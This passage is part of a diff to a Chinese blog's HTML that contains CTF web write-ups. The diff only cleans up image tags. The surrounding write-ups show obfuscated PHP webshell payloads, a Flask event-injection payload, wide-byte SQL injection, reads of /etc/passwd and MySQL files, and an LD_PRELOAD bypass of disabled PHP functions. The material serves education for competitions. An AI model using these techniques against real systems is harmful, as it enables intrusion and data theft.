class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))))))();&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190714001039.png&lt;img src="https://blogpic.zdy.one/img/20190714001039.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190714001039.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里可能需要注意的就是将&lt;code>+&lt;/code>进行 urlencode ，因为&lt;code>+&lt;/code>在 url 中是空格。&lt;/p>
@@ -16358,7 +16352,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nx">qiqhnin&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">iiiiibi&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">hhhhimh&lt;/span>&lt;span class="p">)();&lt;/span>&lt;span class="c1">//phpinfo()
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190714004923.png&lt;img src="https://blogpic.zdy.one/img/20190714004923.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190714004923.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="another-way-step-2">Another Way-Step 2
@@ -16412,7 +16406,7 @@ loading="lazy"
 &lt;p>&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener"
 >无字母数字webshell之提高篇&lt;/a>&lt;/p>
 &lt;p>这两篇也给了我当时很大的启发以及思路。尤其是第二篇中的 payload ，其实可以直接拿来用&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190714230842.png&lt;img src="https://blogpic.zdy.one/img/20190714230842.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190714230842.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>大家可以详细的参考这两篇文章，p牛第一篇是通过位运算以及自增来进行操作，第二篇在 php7 环境下则是通过取反来进行操作，这里前面就简单介绍了一下通过异或的操作形式。&lt;/p>
@@ -17176,7 +17170,7 @@ NULL&lt;/p>
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>很简单的变量覆盖。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009556.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009556.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009556.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-2-web-签到题">Web 2 WEB 签到题
@@ -17553,7 +17547,7 @@ NULL&lt;/p>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里循环使用&lt;code>sprintf&lt;/code>格式化打印&lt;code>$arr&lt;/code>，所以我们只需要让第二次存在一个&lt;code>%s&lt;/code>，即可让他打印出&lt;code>$this-&amp;gt;eacrykey&lt;/code>，所以可以构造&lt;code>nickname=%s&lt;/code>即可得到&lt;code>$this-&amp;gt;eacrykey&lt;/code>为 EzblrbNS&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009342.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009342.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009342.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>之后我们可以发现主要就是要构造&lt;code>$session&lt;/code>这个变量来触发&lt;code>session_read()&lt;/code>函数中的&lt;code>$session = unserialize($session);&lt;/code>&lt;/p>
@@ -17974,7 +17968,7 @@ Flag格式：&lt;code>DDCTF{.....}&lt;/code>，也就是请手动包裹上&lt;co
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以我们就可以利用这个特性，利用题目中的&lt;code>event_handler&lt;/code>来执行任意函数。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002577.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002577.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002577.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>利用&lt;code>#&lt;/code>成功绕过了后缀的限制执行了&lt;code>show_flag_function&lt;/code>函数。&lt;/p>
@@ -18096,7 +18090,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这个函数进入循环执行函数的条件为&lt;code>while len(request.event_queue) &amp;gt; 0&lt;/code>，而&lt;code>trigger_event&lt;/code>函数是可以控制&lt;code>request.event_queue&lt;/code>的关键，所以按照我们之前的思路，我们是不是可以利用这个函数来控制我们的执行顺序呢？&lt;/p>
 &lt;p>例如我们可以先尝试构造&lt;code>action:trigger_event%23;action:buy;8&lt;/code>，我们本地可以通过&lt;code>app.logger.info&lt;/code>来查看&lt;code>execute_event_loop&lt;/code>循环中的&lt;code>action&lt;/code>与&lt;code>args&lt;/code>参数，我们可以得到&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005313.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005313.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005313.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到执行了&lt;code>but_handler&lt;/code>函数，我们注意&lt;code>trigger_event&lt;/code>中是可以接受数组的&lt;/p>
@@ -18112,7 +18106,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>对于数组的处理，他会挨个加入到&lt;code>request.event_queue&lt;/code>，所以我们就可以利用传入数组来控制执行顺序，只要我们传入一个第一个参数为&lt;code>but_handler&lt;/code>的函数，第二个参数为&lt;code>get_Flag&lt;/code>的函数就可以实现在调用花费函数之前来输出 Flag 了。&lt;/p>
 &lt;p>怎么构造数组呢？在&lt;code>execute_event_loop&lt;/code>中对于参数的处理可以自己随便测试一下就知道了他是以&lt;code>:;&lt;/code>之后的字符串以&lt;code>#&lt;/code>为分割来形成数组的。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610001621.jpg&lt;img src="https://blogpic.zdy.one/img/20190610001621.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001621.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以这样子我们就成功将&lt;code>get_flag&lt;/code>函数优先调用了。接下来就是处理一些细节的事情了，比如调用&lt;code>get_Flag&lt;/code>在源代码中是&lt;code>get_flag_handler&lt;/code>，所以我们需要传入的参数是&lt;code>action:get_flag&lt;/code>，以及 Flag 最后是通过以下函数调用&lt;code>trigger_event&lt;/code>把 Flag 输出到&lt;code>session['log']&lt;/code>当中的。&lt;/p>
@@ -18131,7 +18125,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以我们的 payload 就是&lt;code>action:trigger_event%23;action:buy;8%23action:get_flag;&lt;/code>，再通过p牛的 flask cookie 解密脚本即可得到 flag&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009428.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009428.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009428.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-5-欢迎报名ddctf">Web 5 欢迎报名DDCTF
@@ -18144,19 +18138,19 @@ loading="lazy"
 &lt;p>{% endcolorquote %}&lt;/p>
 &lt;h3 id="hacking-4">Hacking
 &lt;/h3>&lt;p>一开始根本打不了…而且还被人用 Beff 搅屎了&amp;hellip;而且严重怀疑这题是中途改题的…很坑&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008967.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008967.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008967.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>首先题目设置比较简单&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009535.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009535.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009535.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>测试 XSS ，但是贼坑的误导你，返回了想误导你走入 sql 注入的大坑。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004518.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004518.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004518.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以用 xss 拿到 admin.php 的 html 源码&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005558.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005558.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005558.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看到源码中一个接口，直接访问提示需要一个 id 的传参，随便输入之后看到响应包&lt;/p>
@@ -18186,23 +18180,23 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>发现&lt;code>Content-Type&lt;/code>为&lt;code>charset=gbk&lt;/code>，猜测是一个宽字节注入。而且并没有什么过滤，直接开注，可能唯一需要一点 trick 的就是需要用十六进制绕过被转义的单引号了&amp;hellip;&lt;/p>
 &lt;p>注出库名&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002153.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002153.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002153.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>注出表名&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610001782.jpg&lt;img src="https://blogpic.zdy.one/img/20190610001782.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001782.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>注出字段名&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009597.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009597.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009597.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>拿到 flag&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005221.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005221.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005221.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然也可以用 sqlmap 直接跑。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009838.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009838.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009838.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也可以指定使用&lt;code>--tamper unmagicquotes&lt;/code>来进行注入&lt;/p>
@@ -18250,16 +18244,16 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>然后看到一道类似&lt;a class="link" href="https://wulidecade.cn/index.php/archives/127/#menu_index_7" target="_blank" rel="noopener"
 >护网杯Itshop&lt;/a>题目，所以考虑这个地方是不是也是用的是余额-支出这么个操作来溢出呢&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007646.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007646.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007646.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>查找 GoLang 的相关数据类型，用 uint32 成功溢出。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007444.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007444.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007444.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测在 price 转换成 int 的时候发生溢出变成 -1 ，导致余额减去花费大于0，成功绕过判断买到入场券。&lt;/p>
 &lt;p>之后就比较简单了，可以通过输入 ticket 杀 bot ，猜测 id 与 ticket 有某种映射关系，可以注册一系列小号买 ticket 保大号杀。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610006639.jpg&lt;img src="https://blogpic.zdy.one/img/20190610006639.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006639.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>附上脚本。&lt;/p>
@@ -18349,7 +18343,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这题还有一种 trick 就是猜榜单已经做出来的师傅的密码，一般 id 都是师傅们的 id ，密码大多都是12345678(别问我怎么知道…我也是12345678&amp;hellip;&lt;/p>
 &lt;p>比如这位师傅，用 12345678 登进去就拿到他的 flag 了。后面就是你敢不敢交的问题了&amp;hellip;手动斜眼，毕竟后面有一段看起来貌似是随机的字符串…可能是主办方用来防作弊的？不得而知…hhhh&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610006149.jpg&lt;img src="https://blogpic.zdy.one/img/20190610006149.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006149.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>后面看官方的 wp 发现光房预设解其实是想让选手用 md5 长度拓展攻击去做的，也可以通过下面这题 mysql 弱口令来读吃鸡的源码拿 flag。&lt;/p>
@@ -18840,11 +18834,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以读&lt;code>/etc/passwd&lt;/code>拿到 mysql 的路径，然后根据 mysql 的路径与 flag 在数据库中的位置提示，我们可以直接读&lt;code>/var/lib/mysql/security/flag.ibd&lt;/code>中可以拿到 flag，也可以读&lt;code>/var/lib/mysql/ibdata1&lt;/code>，只是这个文件一般比较大。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004554.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004554.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004554.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也有师傅说可以读&lt;code>.mysqlhistory&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005095.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005095.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005095.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>.mysql_history&lt;/code>虽然读不到数据库内容，但是在这里可以看到这里出题者是用了&lt;code>insert&lt;/code>，我们可以看到他的操作的语句，也拿到了 flag&lt;/p>
@@ -18893,7 +18887,7 @@ loading="lazy"
 &lt;h2 id="hacking">Hacking
 &lt;/h2>&lt;p>由于环境关掉了，这里就不放图了。说一下几个解法。&lt;/p>
 &lt;p>首先通过弱口令 karaf/karaf 进行认证，进入发现是 jetty 的中间件，然后思路一直走偏在这个中间件上，直到有师傅跟我说 ghost pepper 指的是 Jolokia…nb&amp;hellip;&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009331.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009331.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009331.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后又参考了几篇腾讯云鼎的相关文章：&lt;/p>
@@ -18978,13 +18972,13 @@ Let&amp;rsquo;s try to execute &lt;code>/readflag&lt;/code> to get the flag.
 Open basedir: /var/www/html:/tmp/7833d7f27adcba46bdfd6c9c31c89904
 Hint: eval($_POST[&amp;ldquo;backdoor&amp;rdquo;]);&lt;/p>
 &lt;/blockquote>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008570.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008570.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008570.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="the-first-way-to-hack">The first way to Hack
 &lt;/h2>&lt;p>一看题目意图也比较明显，需要我们利用&lt;code>Imagick&lt;/code>这个模块去进行 rce&lt;/p>
 &lt;p>我们先直接看看&lt;code>phpinfo()&lt;/code>，发现果然是能执行命令的基本都被 disable 掉了&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002789.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002789.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002789.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们还可以调用&lt;code>readfile()&lt;/code>来查看题目源代码&lt;/p>
@@ -19032,7 +19026,7 @@ loading="lazy"
 &lt;p>open_basedir 将 php 所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如&lt;code>fopen()&lt;/code>或&lt;code>file_get_contents()&lt;/code>打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。&lt;/p>
 &lt;p>{% endcolorquote %}&lt;/p>
 &lt;p>例如就像这样，设置了&lt;code>ini_set('open_basedir','/var/www/html');&lt;/code>之后，我们只能在&lt;code>/var/www/html&lt;/code>进行操作，即&lt;code>open_basedir&lt;/code>是用来限制访问目录的&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610006126.jpg&lt;img src="https://blogpic.zdy.one/img/20190610006126.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006126.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="bypass-open_basedir">Bypass Open_Basedir
@@ -19054,7 +19048,7 @@ loading="lazy"
 >LD_PRELOAD的偷梁换柱之能&lt;/a>&lt;/p>
 &lt;h3 id="劫持攻击">劫持攻击
 &lt;/h3>&lt;p>参考的绕过文章使用了&lt;code>mail()&lt;/code>函数，我们可以看看&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004191.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004191.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004191.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里确实开启了子进程，那我们再试试引入&lt;code>putenv()&lt;/code>的效果，配合动态链接库尝试劫持，代码来自&lt;a class="link" href="https://github.com/TarlogicSecurity/Chankro" target="_blank" rel="noopener"
@@ -19155,11 +19149,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004080.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004080.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004080.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到已经执行了&lt;code>ls&lt;/code>命令并成功输出了&lt;code>hacked&lt;/code>，使用&lt;code>strace&lt;/code>看看我们可以发现执行顺序。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008064.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008064.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008064.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然还有另一种劫持，直接选择一个函数进行劫持，例如我们通过&lt;code>strace php test.php&lt;/code>发现调用了&lt;code>geteuid()&lt;/code>以及&lt;code>getpid()&lt;/code>函数，我们可以在&lt;code>hack.c&lt;/code>中这么写&lt;/p>
@@ -19204,12 +19198,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这样也可以完成劫持&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002758.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002758.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002758.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="getflag">GetFlag
 &lt;/h3>&lt;p>所以我们需要找到一个可以启动子进程的函数，以实现我们劫持函数做到 RCE 的目的，然后这里我本地调通了但是远程不知道怎么没打通&amp;hellip;&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009740.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009740.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009740.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我直接用&lt;code>new&lt;/code>了一个&lt;code>.jpg&lt;/code>也可以调用子进程，但是服务器却没有触发&amp;hellip;&lt;/p>
@@ -19286,7 +19280,7 @@ loading="lazy"
 &lt;/div>&lt;h3 id="the-other-way">The other way
 &lt;/h3>&lt;p>也可以利用&lt;a class="link" href="https://www.php.net/manual/zh/function.error-log.php" target="_blank" rel="noopener"
 >error_log&lt;/a>这个方法，这个方法也开启了子进程调用了&lt;code>sendmail&lt;/code>方法。按照之前的思路进行就可以了&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007064.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007064.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007064.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="参考">参考
@@ -19307,12 +19301,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
